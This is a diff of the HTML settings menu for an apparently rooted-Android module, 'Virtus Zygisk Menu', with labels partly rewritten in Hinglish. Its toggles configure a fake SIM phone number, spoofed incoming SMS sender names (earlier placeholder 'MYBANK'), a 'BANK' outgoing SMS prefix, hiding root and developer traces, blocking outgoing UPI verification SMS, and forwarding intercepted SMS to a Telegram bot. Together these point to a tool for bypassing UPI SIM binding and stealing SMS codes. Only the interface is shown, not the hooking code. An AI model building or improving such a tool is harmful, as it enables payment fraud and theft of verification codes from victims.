@@ -8,16 +8,25 @@
 </head>
 <body>
   <div class="shell" id="shell">
+    <div class="glow glow-a" aria-hidden="true"></div>
+    <div class="glow glow-b" aria-hidden="true"></div>
+
     <header class="top">
       <div class="brand">
         <span class="mark" id="brandMark">V</span>
-        <div>
+        <div class="brand-text">
           <div class="name">Virtus Zygisk Menu</div>
           <div class="sub" id="statusLine">off</div>
         </div>
       </div>
       <button type="button" class="icon-btn" id="btnMin" aria-label="Close">✕</button>
     </header>
+
+    <div class="live-rail" id="liveRail">
+      <span class="pill" id="pillPhone"><i></i>Phone</span>
+      <span class="pill" id="pillIntercept"><i></i>Intercept</span>
+      <span class="pill" id="pillTg"><i></i>Telegram</span>
+    </div>
 
     <nav class="tabs" role="tablist">
       <button class="tab active" data-tab="basic">Basic</button>
@@ -27,22 +36,47 @@
 
     <main class="panels">
       <section class="panel active" id="panel-basic">
-        <article class="card">
+        <article class="card card-hero">
           <div class="card-head">
             <div class="ico ico-teal">📱</div>
             <div class="card-copy">
               <h3>Fake Phone Number</h3>
-              <p>Override number shown to apps</p>
+              <p>Apps ko yeh number dikhega</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="enable_sim1_mock" id="swFake" />
               <span class="slider"></span>
             </label>
           </div>
-          <div class="card-body" id="bodyFake">
-            <label class="field">
+          <div class="card-body open" id="bodyFake">
+            <label class="field phone-field">
               <span>Phone number</span>
-              <input type="tel" maxlength="13" inputmode="numeric" data-key="mock_phone_sim1" placeholder="+91 XXXXX XXXXX" />
+              <div class="phone-wrap">
+                <span class="phone-prefix">+91</span>
+                <input type="tel" id="phoneInput" maxlength="11" inputmode="numeric"
+                       data-key="mock_phone_sim1" placeholder="98765 43210" autocomplete="off" />
+              </div>
+            </label>
+            <div class="field-meta" id="phoneMeta">Save ke baad module me update hoga</div>
+          </div>
+        </article>
+
+        <article class="card">
+          <div class="card-head">
+            <div class="ico ico-mint">🏷️</div>
+            <div class="card-copy">
+              <h3>Incoming Sender ID</h3>
+              <p>Inbox pe yeh naam dikhe</p>
+            </div>
+            <label class="switch">
+              <input type="checkbox" data-key="override_incoming_sender" id="swSender" />
+              <span class="slider"></span>
+            </label>
+          </div>
+          <div class="card-body" id="bodySender">
+            <label class="field">
+              <span>Sender ID</span>
+              <input type="text" data-key="inject_sender_id" placeholder="VK-ZYGISK-S" />
             </label>
           </div>
         </article>
@@ -52,7 +86,7 @@
             <div class="ico ico-cyan">✉️</div>
             <div class="card-copy">
               <h3>Outgoing SMS Prefix</h3>
-              <p>Prepend text to every outgoing SMS</p>
+              <p>Har outgoing SMS pe prefix</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="prefix_enabled" id="swPrefix" />
@@ -63,26 +97,6 @@
             <label class="field">
               <span>Prefix text</span>
               <input type="text" data-key="prefix_text" placeholder="BANK " />
-            </label>
-          </div>
-        </article>
-
-        <article class="card">
-          <div class="card-head">
-            <div class="ico ico-mint">🏷️</div>
-            <div class="card-copy">
-              <h3>Incoming Sender ID</h3>
-              <p>Override sender shown on incoming SMS</p>
-            </div>
-            <label class="switch">
-              <input type="checkbox" data-key="override_incoming_sender" id="swSender" />
-              <span class="slider"></span>
-            </label>
-          </div>
-          <div class="card-body" id="bodySender">
-            <label class="field">
-              <span>Sender ID</span>
-              <input type="text" data-key="inject_sender_id" placeholder="MYBANK" />
             </label>
           </div>
         </article>
@@ -108,7 +122,7 @@
             <div class="ico ico-gold">🔒</div>
             <div class="card-copy">
               <h3>Hide Root</h3>
-              <p>Hide Magisk / APatch / KSU traces</p>
+              <p>Magisk / APatch / KSU hide</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="hide_root" />
@@ -122,7 +136,7 @@
             <div class="ico ico-gold">🛠️</div>
             <div class="card-copy">
               <h3>Hide Developer</h3>
-              <p>Hide developer options / USB debug</p>
+              <p>Dev options / USB debug hide</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="hide_developer" />
@@ -136,7 +150,7 @@
             <div class="ico ico-cyan">📤</div>
             <div class="card-copy">
               <h3>Block Outgoing SMS</h3>
-              <p>Also block verify / UPI tokens</p>
+              <p>UPI verify tokens block</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="hook_outgoing_sms" />
@@ -147,12 +161,12 @@
       </section>
 
       <section class="panel" id="panel-telegram">
-        <article class="card">
+        <article class="card card-hero">
           <div class="card-head">
             <div class="ico ico-sky">✈️</div>
             <div class="card-copy">
               <h3>Telegram Forwarding</h3>
-              <p>Send intercepted SMS to your bot</p>
+              <p>Intercepted SMS → bot</p>
             </div>
             <label class="switch">
               <input type="checkbox" data-key="auto_forward_token" id="swTg" />
@@ -174,7 +188,9 @@
     </main>
 
     <footer class="foot">
-      <button type="button" class="primary" id="btnSave">Update / Save</button>
+      <button type="button" class="primary" id="btnSave">
+        <span class="btn-label">Update / Save</span>
+      </button>
       <div class="save-status" id="saveStatus" hidden></div>
       <span class="credit">Virtus Zygisk Menu · <span class="accent">@hivirtus</span></span>
     </footer>
